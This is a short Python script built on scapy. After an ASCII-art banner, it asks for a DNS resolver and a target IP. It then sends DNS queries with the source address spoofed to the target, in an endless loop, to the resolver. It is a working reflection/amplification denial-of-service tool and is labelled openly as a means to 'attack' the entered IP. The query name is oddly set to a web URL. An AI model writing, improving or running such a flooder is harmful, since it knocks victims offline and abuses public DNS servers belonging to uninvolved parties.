from scapy.all import *
print(
"""
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmddys+/:+NMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmhs+/-.``````````+MMMMMMMMMMMMMMMMMMMMMM
MMdyo+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM+.` ```````` ``````yMMMMMMMMMMMMMMMMMMMMM
Mm/yo:dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM/````````````````` `/+sydmMMMMMMMMMMMMMMM
MMh+:osoymMMMMMMMMMMMMMMMMMMMMMMMMMMMM+`````````````      `````.yMMMMMMMMMMMMMM
MMMMms/+soshNMMMMMMMMMMMMMMMMMMMMMMMNm: ``````         ``````  -dMMMMMMMMMMMMMM
MMMMMMNh+/ssosdNMMMMMMMMMMMMMMMMMNh/-.               `````   -yNMMMMMMMMMMMMMMM
MMMMMMMMMms+/osshmMMMMMMMMMMMMMMMd``````         `````.-/oo:`NMMMMMMMMMMMMMMMMM
MMMMMMMMMMMM: .+ysshNMMMMMMMMMMMMMh-.```````````````-odNNNMh+yMMMMMMMMMMMMMMMMM
MMMMMMMMMMMM:   `:sossmNMMMMMMMMMMMMdo-`````````.--/NMMMMMMMm/MMMMMMMMMMMMMMMMM
MMMMMMMMMMN+    /-:./oosyNMMMMMMMMMMMMM//y/.s/:dNMMMNNMMMMN/yNMMMMMMMMMMMMMMMMM
MMMMMMMMMM/    yM/+.: ./ssshMMMMMMMMMMMh-MMNMd+dMMMNoosMMMs+MMMMMMMMMMMMMMMMMMM
MMMMMMMMMs    sMm-  `+dy/-+yssmMMMMMMMMM+oMMNNMMNddddhdMMN:NMMMMMMMMMMMMMMMMMMM
MMMMMMMMMd.   md`  :dhsymms::ys+hMMMMMMMMs+No/ydhdddMMMMm:+hmNMMMMMMMMMMMMMMMMM
MMMMMMMMMMNhydy` `ommmy`yyhmd+-+:yMMMMMMMy:.+omNNhhNMMmo....``-ohmMMMMMMMMMMMMM
MMMMMMMMMMMMMd`  smmmd..:mmys+s.`:hMMMMh-```..`/+osso:.`......` `../yMMMMMMMMMM
MMMMMMMMMMMMM:  +mmmhss `hMM/   `..-od+...``.` `   ``.`....``````...`+NMMMMMMMM
MMMMMMMMMMMMd` `dmmysNm`hs++.     `...`...``.`.. `-:.`.....` `.......`/NMMMMMMM
MMMMMMMMMMMMN/..hysdMy:-MMm.:sys:    `..```.. .  -:-`.....```.........`-dMMMMMM
MMMMMMMMMMMMMMmhdmNMMsshymd`dNMMm`     ` ``..`   --`...````....`.......`.hMMMMM
MMMMMMMMMMMMMMMMMMMMMN+dmo. .:dMd`      `. ..`   ``..````.--`.``........``yMMMM
MMMMMMMMMMMMMMMMMMMMMMs`:.  ./hy+.`     ..``.`   `.```......`.` ..`......``sMMM
MMMMMMMMMMMMMMMMMMMMMMNy:.`````.....``  ...`.`  ````..........` ``........``oMM
MMMMMMMMMMMMMMMMMMMMMMMMNdo+.``.......``...``.  ``.........`````...........` sM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMd-`.......``....   `.........````.............``:hM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMNo.`....` `....` ..........`--...`.........`.+dMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd:``.:+.`....``.`.`...```yNNms:.`````.``:yNMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmNMMM:....`````.``.``.``-/shms.` .-/smMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN-....``...............``.` dMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd`....```.`.`:............`.NMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy`....````..``............``-NMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM/`.....``................`..`:NMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN-`......` `.................../NMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm`........ ```.................`/MMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh .......` ```````````````````  sMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMo``````````````  `````````````` oMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN/  ```````````--````````````````sMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMs ``````````` ym:````````````````hMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh ``````````` dMN:`````````````` .mMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd``````````` .mMMN/`````````````` -NMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN.` ```````` -MMMMN+`````````````` +MMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM:` `````````:MMMMMMy` ```````````` yMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMs```````````+MMMMMMMd. `````````````dMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh ``````````yMMMMMMMMm.```````````` :MMMM
""")
dnsserved = input(str("Enter The DNS Server You Want To Use (8.8.8.8 Is Recommended) : "))
print("Dns Server For Amplification Set To",dnsserved)
victimddfd = input(str("Enter The IP You Want To Attack/Spoof : "))
print(" ")
print("Attacking",victimddfd,"With The Dns Server",dnsserved)
a = IP (dst = dnsserved, src = victimddfd)

b = UDP(dport=53)

c = DNS (id = 1, qr = 0, opcode = 0, tc = 0, rd = 1, qdcount = 1, ancount = 0, nscount = 0, arcount = 0)

c.qd=DNSQR(qname='https://api.publicapis.org/entries',qtype=1,qclass=1)

p = a/b/c
send(p, loop=1, verbose=0)